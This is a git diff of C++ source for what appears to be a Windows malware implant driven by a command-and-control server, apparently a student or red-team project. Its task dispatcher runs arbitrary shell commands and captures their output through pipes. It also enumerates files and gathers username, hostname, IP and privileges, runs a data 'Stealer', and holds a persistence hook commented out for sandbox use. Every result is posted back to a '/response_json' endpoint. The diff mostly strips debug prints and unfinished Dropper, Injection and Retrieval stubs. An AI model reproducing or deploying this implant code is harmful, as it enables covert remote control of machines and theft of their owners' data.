@@ -6,12 +6,6 @@
 - Stealer
 - Execution <arg> - List command to run
 - File_Enumeration <arg> - List files in the directory
-
-TODO:
-- Retrieval - Is commented out?
-- Injection - Will work on it next time
-- Dropper
-
  */
 void execute(std::string command, std::string args, int task_id, int implant_id){
 
@@ -21,32 +15,32 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
     /* Persistance */
     // only uncomment in sandbox
     if(command.compare("Persistence_1") == 0){
-        printf("Executing Persistence\n");
         try{
-            results = "executed";
             std::string username = getUserName();
             // persist_execution(getUserName());
         }
         catch(...){
-            printf("It did not work.\n");
-            HttpResponse("/response_json", implant_id, task_id, results, "failure", command);
+            HttpResponse("/response_json", implant_id, task_id, "failed", "failure", command);
             work = "No";
         }
         if(work.compare("No") == 1){
-            HttpResponse("/response_json", implant_id, task_id, results, "success", command);
+            HttpResponse("/response_json", implant_id, task_id, "executed", "success", command);
         }
         
     }
 
     /* Situational Awareness */
     if(command.compare("Situational_Awareness") == 0){
-        printf("Executing Situational Awareness\n");
+
         try{
             json results_parse = GetAll();
             results.append(results_parse.at("userName"));
             results.append(results_parse.at("compName"));
             // This works but it doesn't fit in the table
-            // results.append(results_parse.at("Privileges"));
+            results.append(results_parse.at("ipName"));
+            results.append(results_parse.at("Privileges"));
+
+            /* Formats string so that the endpoint can accept it */
             results.erase(std::remove(results.begin(), results.end(), '\n'), results.cend());
             results.erase(std::remove(results.begin(), results.end(), '\r'), results.cend()); 
             std::replace( results.begin(), results.end(), '\\', '/');
@@ -66,11 +60,11 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
 
     /* Execution */
     if(command.compare("Execution") == 0){
-        printf("Executing Execution\n");
         try{
             char* c = strcpy(new char[args.length() + 1], args.c_str());
             std::string res = exec(c);
                 
+            /* Formats string so that the endpoint can accept it */
             results = res;
             results.erase(std::remove(results.begin(), results.end(), '\n'), results.cend());
             results.erase(std::remove(results.begin(), results.end(), '\r'), results.cend()); 
@@ -88,11 +82,11 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
     
     /* File Enumeration */
     if(command.compare("File_Enumeration") == 0){
-        printf("Executing File Enumeration\n");
         try{
             std::string path = args;
             std::string storage =(getFileNamesFromPath(path));
 
+            /* Formats string so that the endpoint can accept it */
             results = storage;
             results.erase(std::remove(results.begin(), results.end(), '\n'), results.cend());
             results.erase(std::remove(results.begin(), results.end(), '\r'), results.cend()); 
@@ -112,7 +106,6 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
     if(command.compare("Stealer") == 0){
         try{
             json data_from_driver;
-            printf("Executing Stealer\n");
             data_from_driver = driver();
             //results = data_from_driver.dump(); 
 
@@ -136,33 +129,16 @@ void execute(std::string command, std::string args, int task_id, int implant_id)
 
     }
    
-    /* Retrieval */
-    // Don't know if this has been plemented
-    if(command.compare("Retrieval") ==0 ){
-        printf("Executing Retrieval\n");
-        //Where we add in SendToC2
-    }
-
-    /* Dropper */
-    // Our plans for this changed?
-    if(command.compare("Dropper") == 0){
-        printf("Executing Dropper\n");
-        //Dropper();
-    }
-
-    /* Injection */
-    // Don't know if this works
-    if(command.compare("Injection") == 0){
-        printf("Executing Injection\n");
-
-    }
     return;
 }
 
 
 
 
-
+/* Executing using command line
+using Windows API
+ https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe
+ */
 std::string exec(char* args){
   
    LPSTR cmd = (char*)malloc(sizeof(args)/sizeof(char)
@@ -172,7 +148,7 @@ std::string exec(char* args){
 
     hStdOutRead = GetStdHandle(STD_OUTPUT_HANDLE); 
     if ((hStdOutRead == INVALID_HANDLE_VALUE) || (hStdOutWrite == INVALID_HANDLE_VALUE))
-        return FALSE;
+        return "";
 
     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
@@ -185,8 +161,7 @@ std::string exec(char* args){
     si.cb = sizeof(si);
     
     if (!CreatePipe(&hStdOutRead, &hStdOutWrite, &sa, 0)) {
-        printf("error creating pipe");
-        return FALSE;
+        return "";
     }
     SetHandleInformation(hStdOutRead, HANDLE_FLAG_INHERIT, 0);
     si.dwFlags |= STARTF_USESTDHANDLES;
@@ -213,20 +188,17 @@ std::string exec(char* args){
             do {
             ZeroMemory(buffer, 4096);
             if (!PeekNamedPipe(hStdOutRead, NULL, 0, NULL, &bytesAvail, NULL)) {
-                printf("error peeking at pipe");
                 return "";
             }
 
             if (bytesAvail) {
                 if (!ReadFile(hStdOutRead, buffer, 4095, &bytesRead, NULL)) {
-                    printf("error reading pipe");
                     return "";
                 }
                 if (bytesRead) {
                      char *charData = (char*)buffer;
                     output = std::string(charData);
-                    
-                    //printf("%s", buffer);
+  
                 }
             }
         } while (bytesAvail != 0);
@@ -239,24 +211,3 @@ std::string exec(char* args){
     
     return output;
 }
-
-/* Unused Code
-
-        // //split on space
-        // int i = args.find(" ");
-        // char * prog = (char *) malloc(i);
-        // for (int j =0; j < i; j++){
-        //     prog[j] = args[j];
-        // }
-        // char * a = (char *) malloc(args.size() - i);
-        // for (int k = i; k < args.size(); k++){
-        //     a[k] = args[k];
-        // }
-                    std::stringstream storage;
-            for (auto iterator = file_names.begin(); iterator != file_names.end(); iterator++){
-                if (iterator != file_names.begin()){
-                    storage << " ";
-                }
-                storage << *iterator;
-            }
-*/
